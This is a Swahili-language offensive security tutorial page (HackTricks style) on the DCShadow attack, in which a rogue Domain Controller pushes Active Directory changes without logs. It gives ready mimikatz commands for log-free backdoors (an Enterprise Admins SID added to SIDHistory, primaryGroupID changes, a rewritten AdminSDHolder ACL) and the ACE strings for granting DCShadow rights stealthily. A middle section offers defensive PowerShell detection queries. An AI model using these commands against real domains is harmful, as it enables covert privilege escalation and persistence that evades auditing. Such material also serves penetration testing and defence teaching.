# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Habari za Msingi

Inasajili a **new Domain Controller** katika AD na kulitumia ili **push attributes** (SIDHistory, SPNs...) kwenye vitu vilivyobainishwa **without** kuacha yoyote **logs** kuhusu **modifications**. Unahitaji cheo cha **DA** na uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.

Ili kufanya attack unahitaji 2 mimikatz instances. Moja kati yao itaanzisha RPC servers kwa SYSTEM privileges (lazima uonyeshe hapa mabadiliko unayotaka kufanya), na instance nyingine itatumika ku-push values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Kumbuka kwamba **`elevate::token`** haitafanya kazi katika kikao cha `mimikatz1` kwa kuwa hiyo ilinua ruhusa za thread, lakini tunahitaji kuinua **idhinishaji la mchakato**.\
Unaweza pia kuchagua kitu cha LDAP: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa mtumiaji mwenye idhini hizi za chini kabisa:

- Katika **domain object**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- The **Sites object** (and its children) in the **Configuration container**:
- _CreateChild and DeleteChild_
- The object of the **computer which is registered as a DC**:
- _WriteProperty_ (Not Write)
- The **target object**:
- _WriteProperty_ (Not Write)

Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kuwapa ruhusa hizi mtumiaji asiye na ruhusa (zingatia kwamba hii itaacha baadhi ya logs). Hii ni kali zaidi kuliko kuwa na ruhusa za DA.\
Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kwamba jina la mtumiaji _**student1**_ wakati ameingia kwenye mashine _**mcorp-student1**_ ana ruhusa za DCShadow juu ya object _**root1user**_.

## Kutumia DCShadow kuunda backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Matumizi mabaya ya kikundi cha msingi, mapungufu ya orodha, na utambuzi

- `primaryGroupID` ni sifa tofauti na orodha ya `member` ya kikundi. DCShadow/DSInternals inaweza kuiandika moja kwa moja (kwa mfano, set `primaryGroupID=512` kwa **Domain Admins**) bila utekelezaji wa LSASS kwenye mashine, lakini AD bado **inahama** mtumiaji: kubadilisha PGID kila mara kunatoa uanachama kutoka kwa kikundi cha msingi kilichotangulia (tabia ile ile kwa kikundi chochote kinacholengwa), hivyo huwezi kuhifadhi uanachama wa kikundi cha msingi kilichopita.
- Zana za default huzuia kuondoa mtumiaji kutoka kwa kikundi chao cha msingi cha sasa (`ADUC`, `Remove-ADGroupMember`), hivyo kubadilisha PGID kwa kawaida kunahitaji uandishi wa moja kwa moja kwenye directory (DCShadow/`Set-ADDBPrimaryGroup`).
- Ripoti za uanachama haziko thabiti:
- **Inajumuisha** wanachama walioletwa na kikundi cha msingi: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Hazijumuishi** wanachama walioletwa na kikundi cha msingi: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- Ukaguzi wa rekusivu unaweza kukosa wanachama wa kikundi cha msingi ikiwa **kikundi cha msingi kimewekwa ndani ya kikundi kingine** (kwa mfano, PGID ya mtumiaji inaonyesha kikundi kidogo kilichoko ndani ya Domain Admins); `Get-ADGroupMember -Recursive` au vichujio vya LDAP vinavyofanya rekusivu havitarudishi mtumiaji huyo isipokuwa rekusivu itaelekezwa wazi kutatua vikundi vya msingi.
- Njia za DACL: washambuliaji wanaweza **kukataliwa ReadProperty** kwenye `primaryGroupID` kwa mtumiaji (au kwenye sifa ya kikundi `member` kwa vikundi visivyo chini ya AdminSDHolder), wakificha uanachama halisi kutoka kwa nyingi za maswali ya PowerShell; `net group` bado itatatua uanachama. Vikundi vinavyolindwa na AdminSDHolder vitarekebisha vikwazo hivyo.

Mifano ya utambuzi/ufuatiliaji:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Kagua vikundi vyenye ruhusa kwa kulinganisha matokeo ya `Get-ADGroupMember` na `Get-ADGroup -Properties member` au ADSI Edit ili kugundua utofauti uliosababishwa na `primaryGroupID` au vigezo vilivyofichwa.

## Shadowception - Toa ruhusa za DCShadow kwa kutumia DCShadow (hakuna kumbukumbu za ruhusa zilizobadilishwa)

Tunahitaji kuongeza ACE zifuatazo na SID ya mtumiaji wetu mwishoni:

- Kwenye domain object:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Kwenye attacker computer object: `(A;;WP;;;UserSID)`
- Kwenye target user object: `(A;;WP;;;UserSID)`
- Kwenye Sites object katika Configuration container: `(A;CI;CCDC;;;UserSID)`

Ili kupata ACE ya sasa ya kitu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Kumbuka kwamba katika kesi hii unahitaji kufanya mabadiliko kadhaa, sio moja tu. Kwa hivyo, katika kikao cha mimikatz1 (RPC server) tumia parameter **`/stack` with each change** unayotaka kufanya. Kwa njia hii, utahitaji tu kufanya **`/push`** mara moja ili kutekeleza mabadiliko yote yaliyosimama kwenye server ya rogue.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Marejeo

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
